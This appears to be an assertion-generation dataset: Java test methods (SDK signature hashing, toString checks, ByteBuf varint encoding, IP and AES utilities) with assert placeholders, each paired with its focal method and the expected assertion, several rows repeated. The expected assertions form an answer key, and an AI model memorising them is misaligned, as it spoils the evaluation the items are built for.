"testMd5() { String str = ""a-string-to-hash""; String expectedValue = ""c6b763343cfeada6a408772701329d30"";  String actualValue = SignatureMethodEnum.MD5.calcSign(str);  ""<AssertPlaceHolder>""; }
calcSign(String str) { return signCalculator.calc(str); }"	assertEquals(expectedValue, actualValue)
"testSha1() { String str = ""a-string-to-hash""; String expectedValue = ""db88cd2de9438097edb09014442ed5efebe214a9"";  String actualValue = SignatureMethodEnum.SHA1.calcSign(str);  ""<AssertPlaceHolder>""; }
calcSign(String str) { return signCalculator.calc(str); }"	assertEquals(expectedValue, actualValue)
"testSha256() { String str = ""a-string-to-hash""; String expectedValue = ""47bd5d1c4ab68a55391f0b5304481eb11cb6a7a33066bb8d69c114a69254fdb2"";  String actualValue = SignatureMethodEnum.SHA256.calcSign(str);  ""<AssertPlaceHolder>""; }
calcSign(String str) { return signCalculator.calc(str); }"	assertEquals(expectedValue, actualValue)
"testSm3() { String str = ""a-string-to-hash""; String expectedValue = ""10bd18e0e96b6e9d79f8726c04df6c5aecdda4cf3f8e5c227c76eb3d3c850498"";  String actualValue = SignatureMethodEnum.SM3.calcSign(str);  ""<AssertPlaceHolder>""; }
calcSign(String str) { return signCalculator.calc(str); }"	assertEquals(expectedValue, actualValue)
"testToString() { SignResult result = new SignResult(SignatureMethodEnum.MD5, ""a-secret-id-1"", ""a-sign-1""); String expectedStr = ""SignResult(signMethod=MD5, secretId=a-secret-id-1, signature=a-sign-1)"";  String actualStr = result.toString();  ""<AssertPlaceHolder>""; }
toString() { return ""SignResult("" + ""signMethod="" + signMethod + "", secretId="" + secretId + "", signature="" + signature + "")""; }"	assertEquals(expectedStr, actualStr)
"testNoRetry() { int actualMaxRetryCount = new ClientProfile() .noRetry() .maxRetryCount();  ""<AssertPlaceHolder>""; }
maxRetryCount() { return maxRetryCount; }"	assertEquals(0, actualMaxRetryCount)
"testDefaultHttpClientConfig() { ClientProfile profile = ClientProfile .defaultProfile(secretId, secretKey) .httpClientConfig(null);  DefaultClient client = new DefaultClient(profile);  // 因 httpClient（CloseableHttpClient）属性的校验难度较大，暂时只校验 defaultProtocol ""<AssertPlaceHolder>""; }
defaultProtocol() { return defaultProtocol; }"	assertEquals(ProtocolEnum.HTTPS, client.defaultProtocol())
"testToString() { DefaultClient client = DefaultClient.createDefault(secretId, secretKey);  String expectedStr = ""DefaultClient("" + ""defaultRegionCode="" + client.defaultRegionCode() + "", defaultProtocol="" + client.defaultProtocol() + "", maxAttemptCount="" + client.maxAttemptCount() + "")"";  ""<AssertPlaceHolder>""; }
toString() { return ""DefaultClient("" + ""defaultRegionCode="" + defaultRegionCode + "", defaultProtocol="" + defaultProtocol + "", maxAttemptCount="" + maxAttemptCount + "")""; }"	assertEquals(expectedStr, client.toString())
"testExist() { List<String> actualDomains = resolver.resolve(productCode, regionCode); ""<AssertPlaceHolder>""; }
resolve(String productCode, String regionCode) throws YidunSdkException { String domainKey = genDomainKey(productCode, regionCode); List<String> domains = domainMap.get(domainKey);  if (domains == null) { throw new YidunSdkException( String.format(""No available domain. productCode=%s, regionCode=%s"", productCode, regionCode)); }  return domains; }"	assertSame(domainList, actualDomains)
"testNonExist() { String nonExistRegion = ""non-exist-region-404""; String expectedMsg = ""No available domain. productCode=product-code-1, regionCode=non-exist-region-404"";  YidunSdkException e = null; try { resolver.resolve(productCode, nonExistRegion); } catch (YidunSdkException ex) { e = ex; }  ""<AssertPlaceHolder>""; }
resolve(String productCode, String regionCode) throws YidunSdkException { String domainKey = genDomainKey(productCode, regionCode); List<String> domains = domainMap.get(domainKey);  if (domains == null) { throw new YidunSdkException( String.format(""No available domain. productCode=%s, regionCode=%s"", productCode, regionCode)); }  return domains; }"	assertEquals(expectedMsg, e.getMessage())
"testToString() { String expectedStr = ""EndpointConfigEntry("" + ""productCode=p1"" + "", regionCode=r1"" + "", domains=[a.b.c, x.y.z]"" + "")"";  EndpointConfigEntry entry = new EndpointConfigEntry(productCode, regionCode, domains);  ""<AssertPlaceHolder>""; }
toString() { return ""EndpointConfigEntry("" + ""productCode="" + productCode + "", regionCode="" + regionCode + "", domains="" + domains + "")""; }"	assertEquals(expectedStr, entry.toString())
"loadBlankConfigFile() { Enumeration<URL> configFileEnumeration = createConfigFileEnumeration(""blank_yidun_regional_endpoints.json"");  Map<String, Map<String, List<String>>> domainMap = EndpointConfigLoader.load(configFileEnumeration);  ""<AssertPlaceHolder>""; }
load(Enumeration<URL> configFileUrls) { Map<String, Map<String, List<String>>> domainMap = new HashMap<>();  while (configFileUrls.hasMoreElements()) { List<EndpointConfigEntry> entries = parseConfig(configFileUrls.nextElement()); mergeConfig(domainMap, entries); }  return domainMap; }"	assertTrue(domainMap.isEmpty())
"loadInvalidFormatConfigFile() { Enumeration<URL> configFileEnumeration = createConfigFileEnumeration( ""invalid_format_yidun_regional_endpoints.json"");  Map<String, Map<String, List<String>>> domainMap = EndpointConfigLoader.load(configFileEnumeration);  ""<AssertPlaceHolder>""; }
load(Enumeration<URL> configFileUrls) { Map<String, Map<String, List<String>>> domainMap = new HashMap<>();  while (configFileUrls.hasMoreElements()) { List<EndpointConfigEntry> entries = parseConfig(configFileUrls.nextElement()); mergeConfig(domainMap, entries); }  return domainMap; }"	assertTrue(domainMap.isEmpty())
"testToString() { String expectedStr = ""Breaker(status=CLOSED, lastBreakTimeMillis=-1)""; Breaker breaker = new Breaker();  ""<AssertPlaceHolder>""; }
toString() { return ""Breaker("" + ""status="" + status.get() + "", lastBreakTimeMillis="" + lastBreakTimeMillis.get() + "")""; }"	assertEquals(expectedStr, breaker.toString())
"testToString() { String expectedStr = ""MetricsData(successCount=1, failCount=2)""; MetricsData data = new MetricsData(1, 2); ""<AssertPlaceHolder>""; }
toString() { return ""MetricsData("" + ""successCount="" + successCount + "", failCount="" + failCount + "")""; }"	assertEquals(expectedStr, data.toString())
"testToString() { String expectedStr = ""HttpClientConfig("" + ""protocol=https"" + "", socketTimeoutMillis=5000"" + "", maxIdleTimeMillis=43000"" + "", connectionRequestTimeoutMillis=1000"" + "", connectionKeepAliveMillis=43000"" + "", connectionTimeoutMillis=15000"" + "", responseTimeoutMillis=20000"" + "", maxConnectionCount=200"" + "", maxConnectionCountPerRoute=20"" + "", maxNoResponseRetryCount=1"" + "", proxyScheme=null"" + "", proxyHost=null"" + "", proxyPort=-1)"";  HttpClientConfig config = HttpClientConfig.defaultConfig();  ""<AssertPlaceHolder>""; }
toString() { return ""HttpClientConfig("" + ""protocol="" + protocol + "", socketTimeoutMillis="" + socketTimeoutMillis + "", maxIdleTimeMillis="" + maxIdleTimeMillis + "", connectionRequestTimeoutMillis="" + connectionRequestTimeoutMillis + "", connectionKeepAliveMillis="" + connectionKeepAliveMillis + "", connectionTimeoutMillis="" + connectionTimeoutMillis + "", responseTimeoutMillis="" + responseTimeoutMillis + "", maxConnectionCount="" + maxConnectionCount + "", maxConnectionCountPerRoute="" + maxConnectionCountPerRoute + "", maxNoResponseRetryCount="" + maxNoResponseRetryCount + "", proxyScheme="" + proxyScheme + "", proxyHost="" + proxyHost + "", proxyPort="" + proxyPort + "")""; }"	assertEquals(expectedStr, config.toString())
"testAssembleUrl() { String expectedUrl = ""https://test.org/api/v1/res/id-1/%E8%8E%B7%E5%8F%96%E5%90%8D%E7%A7%B0"" + ""?nothing&from=from-there&to=%E8%BF%99%E9%87%8C""; HttpRequest request = createRequestWithFluentApi();  String actualUrl = request.assembleUrl();  ""<AssertPlaceHolder>""; }
assembleUrl() { Map<String, String> mapQueries = ObjectUtils.defaultIfNull(queryParameters, Collections.emptyMap()); StringBuilder urlBuilder = new StringBuilder(); urlBuilder.append(protocol.toString()); urlBuilder.append(""://"").append(domain); if (null != this.uriPattern) { urlBuilder.append(populatePathParams(uriPattern, pathParameters)); } if (-1 == urlBuilder.indexOf(""?"")) { urlBuilder.append(""?""); } else if (!urlBuilder.toString().endsWith(""?"")) { urlBuilder.append(""&""); }  if (!mapQueries.isEmpty()) { urlBuilder.append(UrlUtils.encode(mapQueries)); }  String url = urlBuilder.toString();  if (url.endsWith(""?"") || url.endsWith(""&"")) { url = url.substring(0, url.length() - 1); } return url; }"	assertEquals(expectedUrl, actualUrl)
"testToString() { String expectedStr = ""BaseRequest("" + ""regionCode="" + regionCode + "", protocol="" + protocol + "", domain="" + domain + "", productCode="" + productCode + "", uriPattern="" + uriPattern + "", method="" + method + "", fallbackHttp=null"" + "")""; BaseRequest<?> request = createRequestWithFluentApi();  ""<AssertPlaceHolder>""; }
toString() { return ""BaseRequest("" + ""regionCode="" + regionCode + "", protocol="" + protocol + "", domain="" + domain + "", productCode="" + productCode + "", uriPattern="" + uriPattern + "", method="" + method + "", fallbackHttp="" + fallbackHttp + "")""; }"	assertEquals(expectedStr, request.toString())
"testToString() { TestRequest request = new TestRequest(); request.businessId(businessId);  PostFormRequest<BaseResponse> superRequest = new TestRequestForString(request) .timestamp(request.timestamp()) .nonce(request.nonce());  String expectedStr = ""BizPostFormRequest("" + ""super="" + superRequest + "", businessId="" + businessId + "")"";  ""<AssertPlaceHolder>""; }
toString() { return ""BizPostFormRequest("" + ""super="" + super.toString() + "", businessId="" + businessId + "")""; }"	assertEquals(expectedStr, request.toString())
"testToString() { String expectedStr = ""CommonResponse(code=2, msg=msg-2)"";  CommonResponse response = new TestResponse(2, ""msg-2"");  ""<AssertPlaceHolder>""; }
toString() { return ""CommonResponse("" + ""code="" + code + "", msg="" + msg + "")""; }"	assertEquals(expectedStr, response.toString())
"testToString() { ResultResponse<String> response = new ResultResponse<>(2, ""msg-2"", ""result-2"");  TestResponseForString superResponse = new TestResponseForString(); superResponse.setCode(response.getCode()); superResponse.setMsg(response.getMsg());  String expectedStr = ""ResultResponse("" + ""super="" + superResponse + "", result=result-2)"";  ""<AssertPlaceHolder>""; }
toString() { return ""ResultResponse("" + ""super="" + super.toString() + "", result="" + result + "")""; }"	assertEquals(expectedStr, response.toString())
"notBlank_for_blank_str() { IllegalArgumentException e = null; try { AssertUtils.notBlank("" "", ""error-1""); } catch (IllegalArgumentException ex) { e = ex; }  ""<AssertPlaceHolder>""; }
notBlank(String str, String message) { if (StringUtils.isBlank(str)) { throw new IllegalArgumentException(message); } }"	"assertEquals(""error-1"", e.getMessage())"
"system26Test() { var list = List.of(1, 5000, Integer.MAX_VALUE); for (var n : list) { var n26 = SliceUtils.toNumberSystem26(n); var fromN26 = SliceUtils.fromNumberSystem26(n26); Assert.""<AssertPlaceHolder>""; } }
fromNumberSystem26(String s) { if (StringUtils.isBlank(s) || !s.matches(""[a-z]*"")) { throw new RuntimeException(StringUtils.format(""字符串{}必须为A-Z的字符串"", s)); } int n = 0; for (int i = s.length() - 1, j = 1; i >= 0; i--, j *= 26) { char c = s.charAt(i); n += (UP_CACE_STR.indexOf(c) + 1) * j; } return n; }"	assertEquals(n.intValue(), fromN26)
"InterruptedException { ProtocolManager.initProtocol(Set.of(MyPacket.class));  var map = new ConcurrentHeapMap<MyPacket>(); var atomicInt = new AtomicInteger(0); var count = 1000_0000;  var countdown = new CountDownLatch(EventBus.EXECUTORS_SIZE); for (int i = 0; i < EventBus.EXECUTORS_SIZE; i++) { EventBus.asyncExecute().execute(new Runnable() { @Override public void run() { var key = atomicInt.getAndIncrement(); while (key < count) { var myPacket = MyPacket.valueOf(key, String.valueOf(key)); map.put(key, myPacket); key = atomicInt.getAndIncrement(); } countdown.countDown(); } }); } countdown.await(); for (var i = 0; i < count; i++) { var myPacket = MyPacket.valueOf(i, String.valueOf(i)); var packet = map.get(i); Assert.""<AssertPlaceHolder>""; } }
get(long key) { checkKey(key); return map.get(key); }"	assertEquals(myPacket, packet)
"loadTest() { ProtocolManager.initProtocol(Set.of(MyPacket.class));  var map = new FileHeapMap<MyPacket>(""db"", MyPacket.class); var count = 1000_0000;  for (var i = 0; i < count; i++) { var myPacket = MyPacket.valueOf(i, String.valueOf(i)); var packet = map.get(i); Assert.""<AssertPlaceHolder>""; } }
get(long key) { return heapMap.get(key); }"	assertEquals(myPacket, packet)
"benchmarkTest() { var map = new HeapMap<MyPacket>();  var count = 1000_0000; for (var i = 0; i < count; i++) { var myPacket = MyPacket.valueOf(i, String.valueOf(i)); map.put(i, myPacket); }  for (var i = 0; i < count; i++) { var myPacket = MyPacket.valueOf(i, String.valueOf(i)); var packet = map.get(i); Assert.""<AssertPlaceHolder>""; } }
get(long key) { checkKey(key); return map.get(key); }"	assertEquals(myPacket, packet)
"pageTest() { var list = new ArrayList<Integer>(); for (var i = 1; i <= 105; i++) { list.add(i); }  var page = Page.valueOf(11, 10, list.size()); var result = page.currentPageList(list).toArray();  Assert.""<AssertPlaceHolder>""; }
currentPageList(List<T> list) { if (CollectionUtils.isEmpty(list)) { return Collections.emptyList(); }  var skip = skipNum(); var to = skip + itemsPerPage;  if (skip >= list.size()) { return Collections.emptyList(); }  if (to >= list.size()) { to = list.size(); }  return list.subList(skip, to); }"	assertArrayEquals(List.of(101, 102, 103, 104, 105).toArray(), result)
"stringTest() { String str = ""hello""; ByteBuf byteBuf = Unpooled.buffer(); ByteBufUtils.writeString(byteBuf, str); String result = ByteBufUtils.readString(byteBuf); Assert.""<AssertPlaceHolder>""; }
readString(ByteBuf byteBuf) { int length = readInt(byteBuf); return length <= 0 ? StringUtils.EMPTY : (String) byteBuf.readCharSequence(length, StringUtils.DEFAULT_CHARSET); }"	assertEquals(result, str)
"readIntTest() { ByteBuf byteBuf = Unpooled.buffer(); for (int value = Integer.MIN_VALUE; value < Integer.MAX_VALUE; value++) { byteBuf.clear(); ByteBufUtils.writeInt(byteBuf, value); int result = ByteBufUtils.readInt(byteBuf); Assert.""<AssertPlaceHolder>""; } }
readInt(ByteBuf byteBuf) { int readIndex = byteBuf.readerIndex(); int b = byteBuf.getByte(readIndex++); int value = b; if (b < 0) { b = byteBuf.getByte(readIndex++); value = value & 0x0000007F | b << 7; if (b < 0) { b = byteBuf.getByte(readIndex++); value = value & 0x00003FFF | b << 14; if (b < 0) { b = byteBuf.getByte(readIndex++); value = value & 0x001FFFFF | b << 21; if (b < 0) { value = value & 0x0FFFFFFF | byteBuf.getByte(readIndex++) << 28; } } } } byteBuf.readerIndex(readIndex); return ((value >>> 1) ^ -(value & 1)); }"	assertEquals(result, value)
"readLongTest() { ByteBuf byteBuf = Unpooled.buffer(); for (long value = Long.MIN_VALUE; value < Long.MAX_VALUE; value++) { byteBuf.clear(); ByteBufUtils.writeLong(byteBuf, value); Assert.""<AssertPlaceHolder>""; } }
readLong(ByteBuf byteBuf) { int readIndex = byteBuf.readerIndex(); long b = byteBuf.getByte(readIndex++); long value = b; if (b < 0) { b = byteBuf.getByte(readIndex++); value = value & 0x00000000_0000007FL | b << 7; if (b < 0) { b = byteBuf.getByte(readIndex++); value = value & 0x00000000_00003FFFL | b << 14; if (b < 0) { b = byteBuf.getByte(readIndex++); value = value & 0x00000000_001FFFFFL | b << 21; if (b < 0) { b = byteBuf.getByte(readIndex++); value = value & 0x00000000_0FFFFFFFL | b << 28; if (b < 0) { b = byteBuf.getByte(readIndex++); value = value & 0x00000007_FFFFFFFFL | b << 35; if (b < 0) { b = byteBuf.getByte(readIndex++); value = value & 0x000003FF_FFFFFFFFL | b << 42; if (b < 0) { b = byteBuf.getByte(readIndex++); value = value & 0x0001FFFF_FFFFFFFFL | b << 49; if (b < 0) { b = byteBuf.getByte(readIndex++); value = value & 0x00FFFFFF_FFFFFFFFL | b << 56; } } } } } } } } byteBuf.readerIndex(readIndex); return ((value >>> 1) ^ -(value & 1)); }"	assertEquals(ByteBufUtils.readLong(byteBuf), value)
"classLocation() { String str = ClassUtils.classLocation(Integer.class); Assert.""<AssertPlaceHolder>""; }
classLocation(final Class<?> cls) { AssertionUtils.notNull(cls); URL result = null; String clsAsResource = cls.getName().replace(StringUtils.PERIOD, StringUtils.SLASH).concat(CLASS_SUFFIX); ProtectionDomain pd = cls.getProtectionDomain(); if (pd != null) { CodeSource cs = pd.getCodeSource(); if (cs != null) { result = cs.getLocation(); } if (result != null) { if (FILE_URL_PROTOCOL.equals(result.getProtocol())) { try { // ""!/""为分隔符，分割jar包，和jar包里的文件 if (result.toExternalForm().endsWith(JAR_SUFFIX) || result.toExternalForm().endsWith(ZIP_SUFFIX)) { result = new URL(JAR_URL_PROTOCOL + StringUtils.COLON + result.toExternalForm() + ""!/"" + clsAsResource); } else if (new File(result.getFile()).isDirectory()) { result = new URL(result, clsAsResource); } } catch (MalformedURLException ignore) { } } } } if (result == null) { final ClassLoader clsLoader = cls.getClassLoader(); result = clsLoader != null ? clsLoader.getResource(clsAsResource) : ClassLoader.getSystemResource(clsAsResource); } return result.toString(); }"	"assertEquals(""jrt:/java.base/java/lang/Integer.class"", str)"
"testXmlWithHead() { var protos = DomUtils.string2Object(XML_WITH_HEAD, XmlProtocols.class); Assert.""<AssertPlaceHolder>""; }
string2Object(String xml, Class<T> clazz) { try { return MAPPER.readValue(xml, clazz); } catch (IOException e) { throw new RunException(e, ""将xml字符串[xml:{}]转换为对象[{}]异常"", xml, clazz); } }"	"assertEquals(""jaysunxiao"", protos.getAuthor())"
"testXmlOfStandardText() { var protos = DomUtils.string2Object(XML_OF_STANDARD_TEXT, XmlProtocols.class); Assert.""<AssertPlaceHolder>""; }
string2Object(String xml, Class<T> clazz) { try { return MAPPER.readValue(xml, clazz); } catch (IOException e) { throw new RunException(e, ""将xml字符串[xml:{}]转换为对象[{}]异常"", xml, clazz); } }"	"assertEquals(""jaysunxiao"", protos.getAuthor())"
"localhostTest() { var localHostStr = NetUtils.getLocalhostStr(); var localHost = NetUtils.getLocalhost(); Assert.""<AssertPlaceHolder>""; }
getLocalhost() { var address = getAllAddress().stream() .filter(it -> !it.isLoopbackAddress() // 非地区本地地址，指10.0.0.0 ~ 10.255.255.255、172.16.0.0 ~ 172.31.255.255、192.168.0.0 ~ 192.168.255.255 && it.isSiteLocalAddress() // 需为IPV4地址 && it instanceof Inet4Address && !it.getHostAddress().contains("":"")) .findFirst();  if (address.isPresent()) { return address.get(); }  try { return InetAddress.getLocalHost(); } catch (UnknownHostException e) { return null; } }"	assertEquals(localHostStr, localHost.getHostAddress())
"ipv4Test() { var ipLong = NetUtils.ipv4ToLong(NetUtils.LOCAL_LOOPBACK_IP); var ipStr = NetUtils.longToIpv4(ipLong); Assert.""<AssertPlaceHolder>""; }
longToIpv4(long longIP) { final StringBuilder sb = new StringBuilder(); // 直接右移24位 sb.append((longIP / 1_000_000_000)); sb.append("".""); // 将高8位置0，然后右移16位 sb.append(longIP / 1_000_000 % 1_000); sb.append("".""); sb.append(longIP / 1_000 % 1_000); sb.append("".""); sb.append(longIP % 1_000); return sb.toString(); }"	assertEquals(ipStr, NetUtils.LOCAL_LOOPBACK_IP)
"isInnerIpTest() { Assert.""<AssertPlaceHolder>""; }
isInnerIP(String ipAddress) { long ipNum = NetUtils.ipv4ToLong(ipAddress);  long aBegin = NetUtils.ipv4ToLong(""10.0.0.0""); long aEnd = NetUtils.ipv4ToLong(""10.255.255.255"");  long bBegin = NetUtils.ipv4ToLong(""172.16.0.0""); long bEnd = NetUtils.ipv4ToLong(""172.31.255.255"");  long cBegin = NetUtils.ipv4ToLong(""192.168.0.0""); long cEnd = NetUtils.ipv4ToLong(""192.168.255.255"");  boolean isInnerIp = isInner(ipNum, aBegin, aEnd) || isInner(ipNum, bBegin, bEnd) || isInner(ipNum, cBegin, cEnd) || ipAddress.equals(LOCAL_LOOPBACK_IP); return isInnerIp; }"	assertTrue(NetUtils.isInnerIP(NetUtils.LOCAL_LOOPBACK_IP))
"test() { String passWord = ""hello world""; String encodePassWorld = AesUtils.getEncryptString(passWord); Assert.""<AssertPlaceHolder>""; }
getDecryptString(String str) { try { var base64Decoder = Base64.getDecoder(); var strBytes = base64Decoder.decode(str); var cipher = Cipher.getInstance(ALGORITHM_STR); cipher.init(Cipher.DECRYPT_MODE, KEY); var decryptStrBytes = cipher.doFinal(strBytes); return new String(decryptStrBytes, StringUtils.DEFAULT_CHARSET_NAME); } catch (Exception e) { throw new RuntimeException(e); }  }"	assertEquals(passWord, AesUtils.getDecryptString(encodePassWorld))
"md5Test() { var str = ""qwerasdfzxcv1234;:'""; Assert.""<AssertPlaceHolder>""; }
bytesToMD5(byte[] bytes) { try {  var messageDigest = MessageDigest.getInstance(MD5_ALGORITHM); // inputByteArray是输入字符串转换得到的字节数组 messageDigest.update(bytes);  // 转换并返回结果，也是字节数组，包含16个元素 // 字符数组转换成字符串返回，MD5将任意长度的字节数组变换成一个16个字节，128bit的大整数 return byteArrayToHex(messageDigest.digest()); } catch (NoSuchAlgorithmException e) { throw new RuntimeException(""MD加密出现未知异常"", e); } }"	assertEquals(MD5Utils.bytesToMD5(str.getBytes()).toLowerCase(), DigestUtils.md5DigestAsHex(str.getBytes()))
"localhostTest() { var localHostStr = NetUtils.getLocalhostStr(); var localHost = NetUtils.getLocalhost(); Assert.""<AssertPlaceHolder>""; }
getLocalhost() { var address = getAllAddress().stream() .filter(it -> !it.isLoopbackAddress() // 非地区本地地址，指10.0.0.0 ~ 10.255.255.255、172.16.0.0 ~ 172.31.255.255、192.168.0.0 ~ 192.168.255.255 && it.isSiteLocalAddress() // 需为IPV4地址 && it instanceof Inet4Address && !it.getHostAddress().contains("":"")) .findFirst();  if (address.isPresent()) { return address.get(); }  try { return InetAddress.getLocalHost(); } catch (UnknownHostException e) { return null; } }"	assertEquals(localHostStr, localHost.getHostAddress())
"ipv4Test() { var ipLong = NetUtils.ipv4ToLong(NetUtils.LOCAL_LOOPBACK_IP); var ipStr = NetUtils.longToIpv4(ipLong); Assert.""<AssertPlaceHolder>""; }
longToIpv4(long longIP) { final StringBuilder sb = new StringBuilder(); // 直接右移24位 sb.append((longIP / 1_000_000_000)); sb.append("".""); // 将高8位置0，然后右移16位 sb.append(longIP / 1_000_000 % 1_000); sb.append("".""); sb.append(longIP / 1_000 % 1_000); sb.append("".""); sb.append(longIP % 1_000); return sb.toString(); }"	assertEquals(ipStr, NetUtils.LOCAL_LOOPBACK_IP)
"isInnerIpTest() { Assert.""<AssertPlaceHolder>""; }
isInnerIP(String ipAddress) { long ipNum = NetUtils.ipv4ToLong(ipAddress);  long aBegin = NetUtils.ipv4ToLong(""10.0.0.0""); long aEnd = NetUtils.ipv4ToLong(""10.255.255.255"");  long bBegin = NetUtils.ipv4ToLong(""172.16.0.0""); long bEnd = NetUtils.ipv4ToLong(""172.31.255.255"");  long cBegin = NetUtils.ipv4ToLong(""192.168.0.0""); long cEnd = NetUtils.ipv4ToLong(""192.168.255.255"");  boolean isInnerIp = isInner(ipNum, aBegin, aEnd) || isInner(ipNum, bBegin, bEnd) || isInner(ipNum, cBegin, cEnd) || ipAddress.equals(LOCAL_LOOPBACK_IP); return isInnerIp; }"	assertTrue(NetUtils.isInnerIP(NetUtils.LOCAL_LOOPBACK_IP))
"test() { for (int i = 0; i < 10; i++) { var passWord = ""hello world""; var encodePassWorld = AesUtils.getEncryptString(passWord); Assert.""<AssertPlaceHolder>""; } }
getDecryptString(String str) { try { var base64Decoder = Base64.getDecoder(); var strBytes = base64Decoder.decode(str); var decryptStrBytes = decrypt(strBytes); return StringUtils.bytesToString(decryptStrBytes); } catch (Exception e) { throw new RuntimeException(e); } }"	assertEquals(passWord, AesUtils.getDecryptString(encodePassWorld))
"md5Test() { var str = ""qwerasdfzxcv1234;:'""; Assert.""<AssertPlaceHolder>""; }
bytesToMD5(byte[] bytes) { try {  var messageDigest = MessageDigest.getInstance(MD5_ALGORITHM); // inputByteArray是输入字符串转换得到的字节数组 messageDigest.update(bytes);  // 转换并返回结果，也是字节数组，包含16个元素 // 字符数组转换成字符串返回，MD5将任意长度的字节数组变换成一个16个字节，128bit的大整数 return byteArrayToHex(messageDigest.digest()); } catch (NoSuchAlgorithmException e) { throw new RuntimeException(""MD加密出现未知异常"", e); } }"	assertEquals(MD5Utils.bytesToMD5(str.getBytes()).toLowerCase(), DigestUtils.md5DigestAsHex(str.getBytes()))
"pageTest() { var list = new ArrayList<Integer>(); for (var i = 1; i <= 105; i++) { list.add(i); }  var page = Page.valueOf(11, 10, list.size()); var result = page.currentPageList(list).toArray();  Assert.""<AssertPlaceHolder>""; }
currentPageList(List<T> list) { if (CollectionUtils.isEmpty(list)) { return Collections.emptyList(); }  var skip = skipNum(); var to = skip + itemsPerPage;  if (skip >= list.size()) { return Collections.emptyList(); }  if (to >= list.size()) { to = list.size(); }  return list.subList(skip, to); }"	assertArrayEquals(List.of(101, 102, 103, 104, 105).toArray(), result)
"stringTest() { String str = ""hello""; ByteBuf byteBuf = Unpooled.buffer(); ByteBufUtils.writeString(byteBuf, str); String result = ByteBufUtils.readString(byteBuf); Assert.""<AssertPlaceHolder>""; }
readString(ByteBuf byteBuf) { int length = readInt(byteBuf); return length <= 0 ? StringUtils.EMPTY : (String) byteBuf.readCharSequence(length, StringUtils.DEFAULT_CHARSET); }"	assertEquals(result, str)
"adjustPaddingEqualTest() { var byteBuf = Unpooled.buffer(); var beforeWriteIndex = byteBuf.writerIndex(); var predictionLength = 1000;  // padding等于0的情况 ByteBufUtils.writeInt(byteBuf, predictionLength); for (int i = 0; i < predictionLength; i++) { ByteBufUtils.writeByte(byteBuf, (byte) 1); }  byteBuf.markReaderIndex(); var bytes1 = ByteBufUtils.readAllBytes(byteBuf); byteBuf.resetReaderIndex();  ByteBufUtils.adjustPadding(byteBuf, predictionLength, beforeWriteIndex);  byteBuf.markReaderIndex(); var bytes2 = ByteBufUtils.readAllBytes(byteBuf); byteBuf.resetReaderIndex();  Assert.""<AssertPlaceHolder>""; }
readAllBytes(ByteBuf byteBuf) { var readableBytes = byteBuf.readableBytes(); var bytes = new byte[readableBytes]; byteBuf.readBytes(bytes); return bytes; }"	assertArrayEquals(bytes1, bytes2)
"adjustPaddingLessTest() { var byteBuf = Unpooled.buffer(); var beforeWriteIndex = byteBuf.writerIndex(); var predictionLength = 1000; var length = predictionLength / 100;  // padding等于0的情况 ByteBufUtils.writeInt(byteBuf, predictionLength); for (int i = 0; i < length; i++) { ByteBufUtils.writeByte(byteBuf, (byte) 1); }   var byteBuf1 = Unpooled.buffer(); ByteBufUtils.writeInt(byteBuf1, length); for (int i = 0; i < length; i++) { ByteBufUtils.writeByte(byteBuf1, (byte) 1); } var bytes1 = ByteBufUtils.readAllBytes(byteBuf1);  ByteBufUtils.adjustPadding(byteBuf, predictionLength, beforeWriteIndex);  byteBuf.markReaderIndex(); var bytes2 = ByteBufUtils.readAllBytes(byteBuf); byteBuf.resetReaderIndex();  Assert.""<AssertPlaceHolder>""; }
readAllBytes(ByteBuf byteBuf) { var readableBytes = byteBuf.readableBytes(); var bytes = new byte[readableBytes]; byteBuf.readBytes(bytes); return bytes; }"	assertArrayEquals(bytes1, bytes2)
"adjustPaddingMoreTest() { var byteBuf = Unpooled.buffer(); var beforeWriteIndex = byteBuf.writerIndex(); var predictionLength = 1000; var length = predictionLength * 10;  // padding等于0的情况 ByteBufUtils.writeInt(byteBuf, predictionLength); for (int i = 0; i < length; i++) { ByteBufUtils.writeByte(byteBuf, (byte) 1); }   var byteBuf1 = Unpooled.buffer(); ByteBufUtils.writeInt(byteBuf1, length); for (int i = 0; i < length; i++) { ByteBufUtils.writeByte(byteBuf1, (byte) 1); } var bytes1 = ByteBufUtils.readAllBytes(byteBuf1);  ByteBufUtils.adjustPadding(byteBuf, predictionLength, beforeWriteIndex);  byteBuf.markReaderIndex(); var bytes2 = ByteBufUtils.readAllBytes(byteBuf); byteBuf.resetReaderIndex();  Assert.""<AssertPlaceHolder>""; }
readAllBytes(ByteBuf byteBuf) { var readableBytes = byteBuf.readableBytes(); var bytes = new byte[readableBytes]; byteBuf.readBytes(bytes); return bytes; }"	assertArrayEquals(bytes1, bytes2)
